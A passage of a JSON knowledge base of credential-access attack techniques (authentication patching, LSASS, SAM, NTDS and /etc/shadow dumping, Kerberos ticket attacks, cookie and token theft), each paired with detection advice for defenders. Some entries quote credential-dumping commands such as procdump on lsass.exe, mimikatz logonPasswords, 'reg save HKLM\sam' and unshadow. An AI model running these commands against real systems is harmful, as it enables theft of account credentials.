        "detection": "\nMonitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages) and correlate then investigate the DLL files these files reference. Password filters will also show up as an autorun and loaded DLL in lsass.exe. Monitor for calls to OpenProcess that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll).  Monitor PAM configuration and module paths (ex: /etc/pam.d/) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.   Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\n"
      },
      "T1556.001": {
        "name": "Domain Controller Authentication",
        "description": " \nAdversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts. \nMalware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex:  Skeleton Key ). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.  \n ",
        "detection": "\nMonitor for calls to OpenProcess that can be used to manipulate lsass.exe running on a domain controller as well as for malicious modifications to functions exported from authentication-related system DLLs (such as cryptdll.dll and samsrv.dll). Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.  Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g. a user has an active login session but has not entered the building or does not have VPN access). \n\n"
      },
      "T1556.002": {
        "name": "Password Filter DLL",
        "description": " \nAdversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated. \nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation. \nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.  \n ",
        "detection": "\nMonitor for new, unfamiliar DLL files written to a domain controller and/or local computer. Monitor for changes to Registry entries for password filters (ex: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages) and correlate then investigate the DLL files these files reference.Password filters will also show up as an autorun and loaded DLL in lsass.exe. \n\n"
      },
      "T1556.003": {
        "name": "Pluggable Authentication Modules",
        "description": " \nAdversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is  pam_unix.so , which retrieves, sets, and verifies account authentication information in  /etc/passwd and  /etc/shadow .  \n \n \n\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as  pam_unix.so , can be patched to accept arbitrary adversary supplied values as legitimate credentials.  \n\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.  \n \n ",
        "detection": "\nMonitor PAM configuration and module paths (ex: /etc/pam.d/) for changes. Use system-integrity tools such as AIDE and monitoring tools such as auditd to monitor PAM files.Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times (ex: when the user is not present) or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\n"
      },
      "T1556.004": {
        "name": "Network Device Authentication",
        "description": " \nAdversaries may use  Patch System Image to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices. \n Modify System Image may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.  \n ",
        "detection": "\nConsider verifying the checksum of the operating system file and verifying the image of the operating system in memory.  Detection of this behavior may be difficult, detection efforts may be focused on closely related adversary behaviors, such as Modify System Image.\n\n"
      },
      "T1040": {
        "name": "Network Sniffing",
        "description": " \nAdversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data. \nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as  LLMNR/NBT-NS Poisoning and SMB Relay , can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary. \nNetwork sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.  ",
        "detection": "\nDetecting the events leading up to sniffing network traffic may be the best method of detection. From the host level, an adversary would likely need to perform a man-in-the-middle attack against other devices on a wired network in order to capture traffic that was not to or from the current compromised system. This change in the flow of information is detectable at the enclave network level. Monitor for ARP spoofing and gratuitous ARP broadcasts. Detecting compromised network devices is a bit more challenging. Auditing administrator logins, configuration changes, and device images is required to detect malicious changes.\n\n"
      },
      "T1003": {
        "name": "OS Credential Dumping",
        "description": " \nAdversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform  Lateral Movement and access restricted information. \nSeveral of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.  ",
        "detection": "\nWindowsMonitor for unexpected processes interacting with lsass.exe.  Common credential dumpers such as Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective Process Injection to reduce potential indicators of malicious activity.Hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised Valid Accounts in-use by adversaries may help as well. On Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,   which may require additional logging features to be configured in the operating system to collect necessary information for analysis.Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.       Note: Domain controllers may not log replication requests originating from the default domain controller account.  . Also monitor for network protocols      and other replication requests   from IPs not associated with known domain controllers.  LinuxTo obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path /proc//maps, where the  directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.\n\n"
      },
      "T1003.001": {
        "name": "LSASS Memory",
        "description": " \nAdversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct  Lateral Movement using  Use Alternate Authentication Material . \nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system. \nFor example, on the target host use procdump:  procdump -ma lsass.exe lsass_dump \nLocally, mimikatz can be run using:  sekurlsa::Minidump lsassdump.dmp  sekurlsa::logonPasswords \nWindows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys:  HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages and  HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages . An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.  \n\nThe following SSPs can be used to access credentials: Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package. Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.  \nKerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later. CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.  \n ",
        "detection": "\nMonitor for unexpected processes interacting with LSASS.exe.  Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective Process Injection to reduce potential indicators of malicious activity.On Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,  which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\n"
      },
      "T1003.002": {
        "name": "Security Account Manager",
        "description": " \nAdversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the  net user command. Enumerating the SAM database requires SYSTEM level access. \nA number of tools can be used to retrieve the SAM file through in-memory techniques: pwdumpx.exe  gsecdump  Mimikatz secretsdump.py \nAlternatively, the SAM can be extracted from the Registry with Reg:  reg save HKLM\\sam sam  reg save HKLM\\system system \nCreddump7 can then be used to process the SAM database locally to retrieve hashes.  \n\nNotes: RID 500 account is the local, built-in administrator. RID 501 is the guest account.* User accounts start with a RID of 1,000+.  ",
        "detection": "\nHash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised Valid Accounts in-use by adversaries may help as well.\n\n"
      },
      "T1003.003": {
        "name": "NTDS",
        "description": " \nAdversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in  %SystemRoot%\\NTDS\\Ntds.dit of a domain controller.  \n\nIn addition to looking NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.  \n\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes. Volume Shadow Copy secretsdump.py Using the in-built Windows tool, ntdsutil.exe Invoke-NinjaCopy  ",
        "detection": "\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit.\n\n"
      },
      "T1003.004": {
        "name": "LSA Secrets",
        "description": " \nAdversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.  \n \n \nLSA secrets are stored in the registry at  HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets . LSA secrets can also be dumped from memory.  \n\n Reg can be used to extract from the Registry.  Mimikatz can be used to extract secrets from memory.  \n ",
        "detection": "\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,  which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\n\n"
      },
      "T1003.005": {
        "name": "Cached Domain Credentials",
        "description": " \nAdversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.  \n\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.  \nThe number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires  Password Cracking to recover the plaintext password.  \n\nWith SYSTEM access, the tools/utilities such as  Mimikatz ,  Reg , and secretsdump.py can be used to extract the cached credentials. \nNote: Cached credentials for Windows Vista are derived using PBKDF2.  \n ",
        "detection": "\nMonitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,  which may require additional logging features to be configured in the operating system to collect necessary information for analysis.Detection of compromised Valid Accounts in-use by adversaries may help as well.\n\n"
      },
      "T1003.006": {
        "name": "DCSync",
        "description": " \nAdversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)  \n  \n  \n  \nto simulate the replication process from a remote domain controller using a technique called DCSync. \nMembers of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data  \nfrom Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a  Golden Ticket for use in  Pass the Ticket  \nor change an account's password as noted in  Account Manipulation .  \n\nDCSync functionality has been included in the \"lsadump\" module in  Mimikatz .  \nLsadump also includes NetSync, which performs DCSync over a legacy replication protocol.  \n ",
        "detection": "\nMonitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.      Also monitor for network protocols    and other replication requests  from IPs not associated with known domain controllers. Note: Domain controllers may not log replication requests originating from the default domain controller account. \n\n"
      },
      "T1003.007": {
        "name": "Proc Filesystem",
        "description": " \nAdversaries may gather credentials from information stored in the Proc filesystem or  /proc . The Proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively. \nThis functionality has been implemented in the MimiPenguin  \n, an open source tool inspired by Mimikatz. The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.  ",
        "detection": "\nTo obtain the passwords and hashes stored in memory, processes must open a maps file in the /proc filesystem for the process being analyzed. This file is stored under the path /proc/*/maps, where the * directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.\n\n"
      },
      "T1003.008": {
        "name": "/etc/passwd and /etc/shadow",
        "description": " \nAdversaries may attempt to dump the contents of  /etc/passwd and  /etc/shadow to enable offline password cracking. Most modern Linux operating systems use a combination of  /etc/passwd and  /etc/shadow to store user account information including password hashes in  /etc/shadow . By default,  /etc/shadow is only readable by the root user.  \n\nThe Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:  \n  # /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db  ",
        "detection": "\nThe AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes attempting to access /etc/passwd and /etc/shadow, alerting on the pid, process name, and arguments of such programs.\n\n"
      },
      "T1528": {
        "name": "Steal Application Access Token",
        "description": " \nAdversaries can steal user application access tokens as a means of acquiring credentials to access remote systems and resources. This can occur through social engineering and typically requires user action to grant access. \nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).  \nOAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.  \n \nAn OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. \nAdversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token. The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.  \nThen, they can send a link through  Spearphishing Link to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through  Application Access Token .  \n\nAdversaries have been seen targeting Gmail, Microsoft Outlook, and Yahoo Mail users.  \n \n ",
        "detection": "\nAdministrators should set up monitoring to trigger automatic alerts when policy criteria are met. For example, using a Cloud Access Security Broker (CASB), admins can create a \"High severity app permissions\" policy that generates alerts if apps request high severity permissions or send permissions requests for too many users.Security analysts can hunt for malicious apps using the tools available in their CASB, identity provider, or resource provider (depending on platform.) For example, they can filter for apps that are authorized by a small number of users, apps requesting high risk permissions, permissions incongruous with the app’s purpose, or apps with old \"Last authorized\" fields. A specific app can be investigated using an activity log displaying activities the app has performed, although some activities may be mis-logged as being performed by the user. App stores can be useful resources to further investigate suspicious apps.Administrators can set up a variety of logs and leverage audit tools to monitor actions that can be conducted as a result of OAuth 2.0 access. For instance, audit reports enable admins to identify privilege escalation actions such as role creations or policy modifications, which could be actions performed after initial access.\n\n"
      },
      "T1558": {
        "name": "Steal or Forge Kerberos Tickets",
        "description": " \nAdversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable  Pass the Ticket . \nKerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \"realms\", there are three basic participants: client, service, and Key Distribution Center (KDC).  \nClients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Attackers may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.  ",
        "detection": "\nMonitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within ticket granting tickets (TGTs), and ticket granting service (TGS) requests without preceding TGT requests.   Monitor the lifetime of TGT tickets for values that differ from the default domain duration. Monitor for indications of Pass the Ticket being used to move laterally. Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).   Monitor for unexpected processes interacting with lsass.exe.  Common credential dumpers such as Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.\n\n"
      },
      "T1558.001": {
        "name": "Golden Ticket",
        "description": " \nAdversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.  \nGolden tickets enable adversaries to generate authentication material for any account in Active Directory.  \n \nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.  \n\nThe KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.  \nThe KRBTGT password hash may be obtained using  OS Credential Dumping and privileged access to a domain controller.  ",
        "detection": "\nMonitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within TGTs, and TGS requests without preceding TGT requests.   Monitor the lifetime of TGT tickets for values that differ from the default domain duration. Monitor for indications of Pass the Ticket being used to move laterally. \n\n"
      },
      "T1558.002": {
        "name": "Silver Ticket",
        "description": " \nAdversaries who have the password hash of a target service account (e.g. SharePoint, MSSQL) may forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets. Kerberos TGS tickets are also known as service tickets.  \n\nSilver tickets are more limited in scope in than golden tickets in that they only enable adversaries to access a particular resource (e.g. MSSQL) and the system that hosts the resource; however, unlike golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult.  \n\nPassword hashes for target services may be obtained using  OS Credential Dumping or  Kerberoasting .  ",
        "detection": "\nMonitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4634, 4672).  Monitor for unexpected processes interacting with lsass.exe.  Common credential dumpers such as Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.\n\n"
      },
      "T1558.003": {
        "name": "Kerberoasting",
        "description": " \nAdversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to  Brute Force .  \n \n \nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service  \n).  \n \n \n \n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).  \n \nPortions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline  Brute Force attacks that may expose plaintext credentials.  \n \n  \n\nThis same attack could be executed using service tickets captured from network traffic.  \n\nCracked hashes may enable  Persistence ,  Privilege Escalation , and  Lateral Movement via access to  Valid Accounts .  \n ",
        "detection": "\nEnable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).  \n\n"
      },
      "T1558.004": {
        "name": "AS-REP Roasting",
        "description": " \nAdversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by  Password Cracking Kerberos messages.  \n \nPreauthentication offers protection against offline  Password Cracking . When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password.  \n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline  Password Cracking attacks similarly to  Kerberoasting and expose plaintext credentials.  \n \n \nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like  PowerShell with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data.  \n \n\nCracked hashes may enable  Persistence ,  Privilege Escalation , and  Lateral Movement via access to  Valid Accounts .  \n ",
        "detection": "\nEnable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4768 and 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17], pre-authentication not required [Type: 0x0]).   \n\n"
      },
      "T1539": {
        "name": "Steal Web Session Cookie",
        "description": " \nAn adversary may steal web application or service session cookies and use them to gain access web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website. \nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.  \n\nThere are several examples of malware targeting cookies from web browsers on the local system.  \n \nThere are also open source frameworks such as Evilginx 2 and Muraena that can gather session cookies through a man-in-the-middle proxy that can be set up by an adversary and used in phishing campaigns.  \n \n\nAfter an adversary acquires a valid cookie, they can then perform a  Web Session Cookie technique to login to the corresponding web application.  ",
        "detection": "\nMonitor for attempts to access files and repositories on a local system that are used to store browser session cookies. Monitor for attempts by programs to inject into or dump browser process memory.\n\n"
      },
      "T1111": {
        "name": "Two-Factor Authentication Interception",
        "description": " \nAdversaries may target two-factor authentication mechanisms, such as smart cards, to gain access to credentials that can be used to access systems, services, and network resources. Use of two or multi-factor authentication (2FA or MFA) is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \nIf a smart card is used for two-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token.  \n\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes).  \n\nOther methods of 2FA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors.  \n ",
        "detection": "\nDetecting use of proxied smart card connections by an adversary may be difficult because it requires the token to be inserted into a system; thus it is more likely to be in use by a legitimate user and blend in with other network behavior.Similar to Input Capture, keylogging activity can take various forms but can may be detected via installation of a driver, setting a hook, or usage of particular API calls associated with polling to intercept keystrokes.\n\n"
      },
      "T1552": {
        "name": "Unsecured Credentials",
        "description": " \nAdversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g.  Bash History ), operating system or application-specific repositories (e.g.  Credentials in Registry ), or other specialized files/artifacts (e.g.  Private Keys ).  ",
        "detection": "\nWhile detecting adversaries accessing credentials may be difficult without knowing they exist in the environment, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See Valid Accounts for more information.Monitor for suspicious file access activity, specifically indications that a process is reading multiple files in a short amount of time and/or using command-line arguments  indicative of searching for credential material (ex: regex patterns). These may be indicators of automated/scripted credential access behavior.Monitoring when the user's .bash_history is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like \"history\" instead of commands like cat ~/.bash_history.Additionally, monitor processes for applications that can be used to query the Registry, such as Reg, and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.\n\n"
      },
      "T1552.001": {
        "name": "Credentials In Files",
        "description": " \nAdversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords. \nIt is possible to extract passwords from backups or saved virtual machines through  OS Credential Dumping .  \nPasswords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.  \n\nIn cloud environments, authenticated user credentials are often stored in local configuration and credential files. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.  \n ",
        "detection": "\nWhile detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See Valid Accounts for more information.\n\n"
      },
      "T1552.002": {
        "name": "Credentials in Registry",
        "description": " \nAdversaries may search the Registry on compromised systems for insecurely stored credentials. The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons. \nExample commands to find Registry keys related to password information:  \nLocal Machine Hive:  reg query HKLM /f password /t REG_SZ /s Current User Hive:  reg query HKCU /f password /t REG_SZ /s  ",
        "detection": "\nMonitor processes for applications that can be used to query the Registry, such as Reg, and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.\n\n"
      },
      "T1552.003": {
        "name": "Bash History",
        "description": " \nAdversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the \"history\" utility. Once a user logs out, the history is flushed to the user’s  .bash_history file. For each user, this file resides at the same location:  ~/.bash_history . Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Attackers can abuse this by looking through the file for potential credentials.  \n ",
        "detection": "\nMonitoring when the user's .bash_history is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like \"history\" instead of commands like cat ~/.bash_history.\n\n"
      },
      "T1552.004": {
        "name": "Private Keys",
